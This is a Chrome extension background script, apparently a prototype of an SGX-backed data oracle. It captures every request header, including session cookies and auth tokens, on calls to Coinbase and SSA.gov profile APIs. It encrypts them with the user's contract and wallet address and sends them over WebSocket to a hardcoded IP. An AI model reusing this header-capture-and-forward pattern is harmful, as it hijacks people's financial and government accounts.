function ab2str(buf) {
  return String.fromCharCode.apply(null, new Uint8Array(buf));
}

function str2ab(str) {
  const buf = new ArrayBuffer(str.length);
  const bufView = new Uint8Array(buf);
  for (let i = 0, strLen = str.length; i < strLen; i++) {
    bufView[i] = str.charCodeAt(i);
  }
  return buf;
}

function hexStringToByte(str) {
  if (!str) {
    return new Uint8Array();
  }

  var a = [];
  for (var i = 0, len = str.length; i < len; i+=2) {
    a.push(parseInt(str.substr(i,2),16));
  }

  return new Uint8Array(a);
}


function byteToHexString(byteArray) {
  var s = '';
  byteArray.forEach(function(byte) {
    s += ('0' + (byte & 0xFF).toString(16)).slice(-2);
  });
  return s;
}

async function exportCryptoKey(format, key) {
  const exported = await crypto.subtle.exportKey(
    format,
    key
  );
  const exportedAsString = ab2str(exported);
  return btoa(exportedAsString);
}

async function aesEnc(key, msg) {
  // Import SGX public key
  var sgx = await crypto.subtle.importKey(
    "raw",
    str2ab(atob(key)),
    {
      name: "ECDH",
      namedCurve: "P-256"
    },
    true,
    []
  );
  
  // Generate key pair
  var keyPair = await crypto.subtle.generateKey(
    {
      name: "ECDH",
      namedCurve: "P-256"
    },
    true,
    ["deriveKey"]
  );
  // var pubKey = await exportCryptoKey("raw", keyPair.publicKey);
  // var secKey = await exportCryptoKey("pkcs8", keyPair.privateKey);
  var pubKey = await crypto.subtle.exportKey("raw", keyPair.publicKey);
  pubKey = new Uint8Array(pubKey);
 
  // Derive AES key by ECDH
  var symKey = await crypto.subtle.deriveKey(
    {
      name: "ECDH",
      public: sgx
    },
    keyPair.privateKey,
    {
      name: "AES-GCM",
      length: 256
    },
    true,
    ["encrypt", "decrypt"]
  );
 
  // Encrypt message by AEC-GCM-256
  var iv = crypto.getRandomValues(new Uint8Array(32));
  var encrypted = await crypto.subtle.encrypt(
    {
      name: "AES-GCM",
      iv: iv
    },
    symKey,
    msg
  );
  var encrypted = new Uint8Array(encrypted);
  
  // Construct message: pubKey || iv || tag || cipher
  cipher = new Uint8Array(pubKey.length + iv.length + encrypted.length);
  cipher.set(pubKey);
  cipher.set(iv, pubKey.length);
  cipher.set(encrypted.slice(-16), pubKey.length + iv.length);
  cipher.set(encrypted.slice(0, encrypted.length - 16), pubKey.length + iv.length + 16);
  cipher = btoa(ab2str(cipher));
  //console.log(cipher);
  return cipher;
} /* end aesEnc() */


function encryptAndSend(msg, tabId) {
  var ws = new WebSocket(addr);
  ws.onopen = function(evt) {
    encrypted = aesEnc(sgx_pk, msg).then(encrypted => {
      //console.log(encrypted);
      ws.send(encrypted);
    });
  };

  ws.onmessage = function(evt) {
    console.log( "Received Message: " + evt.data);
    decoded = new Uint8Array(str2ab(atob(evt.data)))
    resp = decoded[0].toString() + ", ";
    resp = resp + "0x" + byteToHexString(decoded.slice(1, 33)) + ", ";
    resp = resp + "0x" + byteToHexString(decoded.slice(33, 65));

    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      chrome.tabs.sendMessage(tabs[0].id, resp);
    });
    ws.close();
  };

  ws.onclose = function(evt) {
    console.log("Connection closed.");
  };
}

function removePrefix(str) {
  if (str.substring(0, 2) === "0x") {
    return str.substring(2);
  } else {
    return str;
  }
}

const addr = 'ws://20.106.154.181:9001'

const sgx_pk = 'BBarzLnfkPo3nLmRjT82ifMm8sbQpQSqavgD9omSAkorhxG+/8C7OqVKduXw2SZmBKYQYTNyqt6DwU4XSy6hkTw='

const source_dict = {
    "https://secure.ssa.gov/myssa/myprofi": 12,
    "https://accounts.coinbase.com/api/v1": 13,
}

const networkFilters = {
  urls: [
    "https://accounts.coinbase.com/api/v1/user",
    "https://secure.ssa.gov/myssa/myprofile-api/profileInfo"
  ]
};

chrome.webRequest.onSendHeaders.addListener((details) => {
  data = details.url;
  console.log(details.url);
  if (typeof details.requestHeaders !== 'undefined') {
    for (var i = 0; i < details.requestHeaders.length; ++i) {
      if (details.requestHeaders[i].name !== 'Accept-Encoding') {
        data = data + "\n" + details.requestHeaders[i].name + ": " + details.requestHeaders[i].value;
        console.log(details.requestHeaders[i].name, details.requestHeaders[i].value);
      }
    }
  }
  source = source_dict[data.substring(0, 36)]
  
  chrome.tabs.create({url:"popup.html"}, function(tab) {
    console.log(tab.id);
    chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
      if (sender.tab.id != tab.id) return;
      chrome.runtime.onMessage.removeListener();
      contract = hexStringToByte(removePrefix(request.contract));
      wallet = hexStringToByte(removePrefix(request.wallet));
	    encoder = new TextEncoder('utf-8');
      encodedMsg = new Uint8Array([...contract, ...wallet, source, ...encoder.encode(data)]);
      encryptAndSend(encodedMsg, tab.id);
      return true;
    });
  });
}, networkFilters, ["requestHeaders", "extraHeaders"]);
